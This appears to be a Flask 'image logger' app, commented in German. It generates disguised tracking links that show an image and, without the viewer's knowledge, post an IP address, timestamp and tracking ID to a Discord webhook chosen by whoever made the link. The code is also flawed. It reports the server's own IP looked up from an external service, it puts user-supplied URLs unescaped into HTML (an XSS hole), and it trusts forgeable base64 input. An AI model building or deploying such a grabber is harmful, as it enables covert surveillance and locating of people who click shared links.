from flask import Flask, request, jsonify, send_from_directory
import os
import json
import secrets
from datetime import datetime
import urllib.request
import base64

app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/upload', methods=['POST'])
def upload_image():
    try:
        data = request.get_json()
        image_url = data.get('image_url', '').strip()
        webhook_url = data.get('webhook', '').strip()
        
        if not image_url:
            return jsonify({'error': 'Bild-URL ist erforderlich'}), 400
        
        if not webhook_url:
            return jsonify({'error': 'Webhook URL ist erforderlich'}), 400
        
        # Generiere Tracking-ID
        tracking_id = secrets.token_urlsafe(8)
        
        # Erstelle Tracking-Daten
        tracking_data = {
            'id': tracking_id,
            'image_url': image_url,
            'webhook_url': webhook_url,
            'created_at': datetime.now().isoformat()
        }
        
        # Kodiere als Base64 (für kompatibilität)
        tracking_data_encoded = base64.b64encode(json.dumps(tracking_data).encode()).decode()
        
        # Generiere Tracking-URL
        protocol = 'https://'
        host = request.host
        tracking_url = f"{protocol}{host}/track?data={tracking_data_encoded}"
        
        return jsonify({
            'success': True,
            'tracking_id': tracking_id,
            'tracking_url': tracking_url
        })
        
    except Exception as e:
        return jsonify({'error': f'Server-Fehler: {str(e)}'}), 500

@app.route('/track')
def track_image():
    # Hole Base64-Daten
    tracking_data_encoded = request.args.get('data')
    
    if not tracking_data_encoded:
        return "Tracking-Daten fehlen", 400
    
    try:
        # Dekodiere die Base64-Daten
        tracking_data = json.loads(base64.b64decode(tracking_data_encoded).decode())
        
        # Hole IP-Adresse
        ip_address = "Unbekannt"
        try:
            response = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5)
            data = json.loads(response.read().decode())
            ip_address = data.get('ip', 'Unbekannt')
        except:
            ip_address = request.remote_addr or "Unbekannt"
        
        # Sende Discord-Benachrichtigung
        try:
            send_discord_message(tracking_data['webhook_url'], ip_address, tracking_data['id'])
        except Exception as e:
            print(f"Discord Fehler: {e}")
        
        # Zeige Bild
        image_url = tracking_data['image_url']
        
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Tracking Bild">
    <meta property="og:description" content="Jemand hat dein Bild angesehen">
    <meta property="og:image" content="{image_url}">
    <meta property="og:url" content="{request.url}">
    <meta property="og:type" content="website">
    <style>
        body {{ 
            margin: 0; 
            padding: 0; 
            background: #000; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
        }}
        img {{ 
            max-width: 100%; 
            height: auto; 
            max-height: 90vh;
            object-fit: contain;
        }}
    </style>
</head>
<body>
    <img src="{image_url}" alt="Tracking Bild">
</body>
</html>
        """
        
    except Exception as e:
        return f"Fehler: {str(e)}", 500

def send_discord_message(webhook_url, ip_address, tracking_id):
    """Sendet Discord-Nachricht"""
    try:
        # Einfache Nachricht
        message = f"🔍 **Bild wurde angesehen!**\n\n**IP-Adresse:** `{ip_address}`\n**Uhrzeit:** `{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}`\n**Tracking-ID:** `{tracking_id}`"
        
        data = {
            "content": message
        }
        
        req = urllib.request.Request(
            webhook_url,
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            result = response.read().decode()
            print(f"Discord Response: {result}")
            return result
            
    except Exception as e:
        print(f"Fehler beim Senden an Discord: {e}")
        raise

@app.route('/health')
def health_check():
    return jsonify({'status': 'healthy'})

# Vercel Handler
def handler(request):
    return app(request)

if __name__ == '__main__':
    app.run(debug=True)
